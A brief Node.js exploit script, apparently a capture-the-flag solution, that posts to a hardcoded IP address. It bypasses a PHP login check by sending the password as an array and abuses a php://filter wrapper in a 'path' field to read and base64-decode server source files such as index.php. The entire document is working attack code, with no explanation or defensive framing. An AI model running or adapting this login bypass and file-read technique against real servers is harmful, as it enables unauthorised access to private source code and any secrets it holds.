const got = require('got')

const HOST = 'http://120.55.43.255:21173/'

const getBody = (response) => response.body.slice('There is a ping.phpRight!!!login success'.length)

const source = async (filename) => {
  let response = await got.post(`${HOST}/`, {
    form: {
      'password[]': 'whatever',
      path: `php://filter/read=convert.base64-encode/resource=${filename}`,
    },
  })
  return Buffer.from(getBody(response), 'base64').toString()
}

;(async () => {
  let filename = process.argv.slice(2)[0] || 'index.php'
  console.log(await source(filename))
})()
